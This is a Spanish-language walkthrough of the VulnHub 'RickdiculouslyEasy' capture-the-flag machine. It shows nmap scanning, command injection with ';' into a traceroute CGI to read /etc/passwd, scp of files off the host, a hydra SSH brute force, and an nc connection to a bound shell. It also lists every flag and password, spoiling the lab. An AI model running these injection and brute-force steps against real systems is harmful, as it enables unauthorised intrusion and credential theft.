# Cómo he vulnerando la máquina vulnerable de Rick y Morty

## https://www.vulnhub.com/entry/rickdiculouslyeasy-1%2C207/

### Primero hice un reconicimiento de la red en busca de la IP de la máquina virtual (siendo que únicamente conozco la MAC y la red padre):

sudo netdiscover

### Obtengo la IP de la máquina a atacar:

192.168.1.243

### Seguidamente hice un nmap -A -p- para buscar más información sobre los puertos abiertos junto al servicio que usa y su versión:
```
nmap -A -p- 192.168.1.243
```
```
┌──(kali㉿kali)-[~]
└─$ nmap -A -p- 192.168.1.243
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-09 10:15 CEST
Nmap scan report for 192.168.1.243
Host is up (0.00025s latency).
Not shown: 65528 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.1.154
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
|_drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
22/tcp    open  ssh?
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   NULL: 
|_    Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic x86_64)
80/tcp    open  http    Apache httpd 2.4.27 ((Fedora))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Morty's Website
|_http-server-header: Apache/2.4.27 (Fedora)
9090/tcp  open  http    Cockpit web service 161 or earlier
|_http-title: Did not follow redirect to https://192.168.1.243:9090/
13337/tcp open  unknown
| fingerprint-strings: 
|   NULL: 
|_    FLAG:{TheyFoundMyBackDoorMorty}-10Points
22222/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey: 
|   2048 b4:11:56:7f:c0:36:96:7c:d0:99:dd:53:95:22:97:4f (RSA)
|   256 20:67:ed:d9:39:88:f9:ed:0d:af:8c:8e:8a:45:6e:0e (ECDSA)
|_  256 a6:84:fa:0f:df:e0:dc:e2:9a:2d:e7:13:3c:e7:50:a9 (ED25519)
60000/tcp open  unknown
| fingerprint-strings: 
|   NULL, ibm-db2: 
|_    Welcome to Ricks half baked reverse shell...
|_drda-info: ERROR
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port22-TCP:V=7.94SVN%I=7%D=4/9%Time=67F62CBB%P=x86_64-pc-linux-gnu%r(NU
SF:LL,42,"Welcome\x20to\x20Ubuntu\x2014\.04\.5\x20LTS\x20\(GNU/Linux\x204\
SF:.4\.0-31-generic\x20x86_64\)\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port13337-TCP:V=7.94SVN%I=7%D=4/9%Time=67F62CBB%P=x86_64-pc-linux-gnu%r
SF:(NULL,29,"FLAG:{TheyFoundMyBackDoorMorty}-10Points\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port60000-TCP:V=7.94SVN%I=7%D=4/9%Time=67F62CC1%P=x86_64-pc-linux-gnu%r
SF:(NULL,2F,"Welcome\x20to\x20Ricks\x20half\x20baked\x20reverse\x20shell\.
SF:\.\.\n#\x20")%r(ibm-db2,2F,"Welcome\x20to\x20Ricks\x20half\x20baked\x20
SF:reverse\x20shell\.\.\.\n#\x20");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.52 seconds

```

### Lo primero en lo que me fijé al iniciar la máquina vulneralbe es que hay un mensaje que apunta a un servidor web en el puerto 9090, no hay nada interesante más allá de una flag:

```
192.168.1.243:9090


FLAG {There is no Zeus, in your face!} - 10 Points
```

### También, en la salida de nmap, en el puerto 13337 encontramos una flag

```
13337/tcp open  unknown
| fingerprint-strings: 
|   NULL: 
|_    FLAG:{TheyFoundMyBackDoorMorty}-10Points
```

### Accedí al servidor web, por el puerto 80, tras no encontrar nada, miré robots.txt donde encontré esto:
```
They're Robots Morty! It's ok to shoot them! They're just Robots!

/cgi-bin/root_shell.cgi
/cgi-bin/tracertool.cgi
/cgi-bin/*
```

### root_shell.cgi está bajo construcción y no contiene nada interesante, pero tracertool.cgi es una herramienta que únicamente hace traceroute a la IP que le mandes, lo importante, es que está mal programado y se pueden escapar los comandos usando ";", esto fué lo que encontré:
```
;ls -la /var/www/html
drwxr-xr-x. 3 root root     76 Aug 22  2017 .
drwxr-xr-x. 4 root root     33 Aug 22  2017 ..
-rw-r--r--. 1 root root    326 Aug 22  2017 index.html
-rw-r--r--. 1 root root 539672 Aug 22  2017 morty.png
drwxr-xr-x. 2 root root     44 Aug 23  2017 passwords
-rw-r--r--. 1 root root    126 Aug 22  2017 robots.txt
```
### Al mirar en el endpoint password encontramos una flag y password.html

```
[TXT]	FLAG.txt 	2017-08-22 02:31 	44 	 
[TXT]	passwords.html 	2017-08-23 19:51 	352
```
#### flag.txt contiene:
```
FLAG{Yeah d- just don't do it.} - 10 Points
```
#### passwords.html contiene:
```
<!DOCTYPE html>
<html>
<head>
<title>Morty's Website</title>
<body>Wow Morty real clever. Storing passwords in a file called passwords.html? You've really done it this time Morty. Let me at least hide them.. I'd delete them entirely but I know you'd go bitching to your mom. That's the last thing I need.</body>
<!--Password: winter-->
</head>
</html>
```

### Tenermos una contraseña "winter", seguidamente busqué si podía ver el contenido de /etc/passwd para ver los usuarios del sistema y me encontré con que habían modificado el binario de "cat" para mostrar un gato en ASCII, por lo que usé tail -n 100 para mostrar todo el contenido

```
;cat /etc/passwd
                         _
                        | \
                        | |
                        | |
   |\                   | |
  /, ~\                / /
 X     `-.....-------./ /
  ~-. ~  ~              |
     \             /    |
      \  /_     ___\   /
      | /\ ~~~~~   \  |
      | | \        || |
      | |\ \       || )
     (_/ (_/      ((_/

```
```
;tail -n 100 /etc/passwd

root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-coredump:x:999:998:systemd Core Dumper:/:/sbin/nologin
systemd-timesync:x:998:997:systemd Time Synchronization:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:997:996:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
cockpit-ws:x:996:994:User for cockpit-ws:/:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
chrony:x:995:993::/var/lib/chrony:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash
Morty:x:1001:1001::/home/Morty:/bin/bash
Summer:x:1002:1002::/home/Summer:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
```
### Encontré los usuarios
- RickSanchez
- Morty
- Summer

### Habiendo encontrado antes una contraseña "winter", intenté acceder por ssh con el usuario Summer (nota: el servicio ssh está en el puerto 22222)
```
┌──(kali㉿kali)-[~]
└─$ ssh Summer@192.168.1.243 -p 22222
```
### Encontré en su direcctorio unicamente esta flag

```
[Summer@localhost ~]$ tail FLAG.txt 
FLAG{Get off the high road Summer!} - 10 Points
```
### Seguidamente busqué en el home de RickSanchez y Morty, encontrando estos ficheros que extaje a mi máquina usando scp
```
scp -P 22222 Summer@192.168.1.243:/home/Morty/journal.txt.zip ./

scp -P 22222 Summer@192.168.1.243:/home/Morty/Safe_Password.jpg ./

scp -P 22222 Summer@192.168.1.243:/home/RickSanchez/RICKS_SAFE/safe ./
```
### Al intentar descomprimir journal.txt me pide contraseña
```
┌──(kali㉿kali)-[~/Desktop/maquina_rick_y_morty]
└─$ unzip journal.txt.zip 
Archive:  journal.txt.zip
[journal.txt.zip] journal.txt password: 
```

### La imagen es una foto de Rick, nada interesante, pero al mirar con strings podemos encontrar una contraseña oculta "Meeseek"

```
┌──(kali㉿kali)-[~/Desktop/maquina_rick_y_morty]
└─$ strings Safe_Password.jpg 
JFIF
Exif
8 The Safe Password: File: /home/Morty/journal.txt.zip. Password: Meeseek
8BIM
8BIM
$3br
```
### Una vez descomprimido, es una flag, pero aún más importante, tiene un código
```
┌──(kali㉿kali)-[~/Desktop/maquina_rick_y_morty]
└─$ cat journal.txt
Monday: So today Rick told me huge secret. He had finished his flask and was on to commercial grade paint solvent. He spluttered something about a safe, and a password. Or maybe it was a safe password... Was a password that was safe? Or a password to a safe? Or a safe password to a safe?

Anyway. Here it is:

FLAG: {131333} - 20 Points 
```

### Al intentar ejecutar el script safe sale esto:

```
┌──(kali㉿kali)-[~/Desktop/maquina_rick_y_morty]
└─$ ./safe         
Past Rick to present Rick, tell future Rick to use GOD DAMN COMMAND LINE AAAAAHHAHAGGGGRRGUMENTS!
```

### Por lo que usaré de argumento el código de la flag de antes

```
┌──(kali㉿kali)-[~/Desktop/maquina_rick_y_morty]
└─$ ./safe 131333
decrypt:        FLAG{And Awwwaaaaayyyy we Go!} - 20 Points

Ricks password hints:
 (This is incase I forget.. I just hope I don't forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
Follow these clues, in order


1 uppercase character
1 digit
One of the words in my old bands name.
```

### Parece que tenemos pistas para averiguar la contraseña de RickSanchez, el cual ya sabemos que tiene permisos de sudo, haré una lista con todas las posibles convinaciones y la probaré con hydra (El nombre de la antigua banda de Rick es "The Flesh Curtains")

```
┌──(kali㉿kali)-[~/Desktop/maquina_rick_y_morty]
└─$ for l in {A..Z}; do for d in {0..9}; do for w in The Flesh Curtains; do echo "${l}${d}${w}"; done; done; done > listarick.txt
```

```
┌──(kali㉿kali)-[~/Desktop/maquina_rick_y_morty]
└─$ hydra -l RickSanchez -P listarick.txt ssh://192.168.1.243:22222
```

```
┌──(kali㉿kali)-[~/Desktop/maquina_rick_y_morty]
└─$ hydra -l RickSanchez -P listarick.txt ssh://192.168.1.243:22222

[DATA] max 16 tasks per 1 server, overall 16 tasks, 780 login tries (l:1/p:780), ~49 tries per task
[DATA] attacking ssh://192.168.1.243:22222/
[STATUS] 146.00 tries/min, 146 tries in 00:01h, 637 to do in 00:05h, 13 active
[STATUS] 112.00 tries/min, 336 tries in 00:03h, 448 to do in 00:05h, 12 active
[22222][ssh] host: 192.168.1.243   login: RickSanchez   password: P7Curtains
1 of 1 target successfully completed, 1 valid password found

```

### Dando como resultado que la contraseña de RickSanchez es "P7Curtains", accedí por ssh

```
┌──(kali㉿kali)-[~/Desktop/maquina_rick_y_morty]
└─$ ssh -p 22222 RickSanchez@192.168.1.243

RickSanchez@192.168.1.243's password: 
Last failed login: Wed Apr  9 20:14:56 AEST 2025 from 192.168.1.154 on ssh:notty
There were 557 failed login attempts since the last successful login.
Last login: Wed Apr  9 18:35:34 2025
[RickSanchez@localhost ~]$ 
```

### Me puse a buscar las banderas que me quedaban y encontré esta ubicada en /root y en /var/ftp

```
[RickSanchez@localhost ~]$ sudo find / -iname "flag.txt"
/root/FLAG.txt
/var/ftp/FLAG.txt
/var/www/html/passwords/FLAG.txt
/home/Summer/FLAG.txt
```

```
[RickSanchez@localhost ~]$ sudo tail /root/FLAG.txt
FLAG: {Ionic Defibrillator} - 30 points
```
```
[RickSanchez@localhost ~]$ sudo tail /var/ftp/FLAG.txt
FLAG{Whoa this is unexpected} - 10 Points
```

### En total obtuve 8 banderas, haciendo un total de 120 puntos (siendo 130 el máximo), tras no poder encontrarla, miré en la documentación y esta es la última que me faltaba

```
┌──(kali㉿kali)-[~/Desktop/maquina_rick_y_morty]
└─$ nc 192.168.1.243 60000
Welcome to Ricks half baked reverse shell...
# ls
FLAG.txt 
# cat FLAG.txt
FLAG{Flip the pickle Morty!} - 10 Points 
# 
```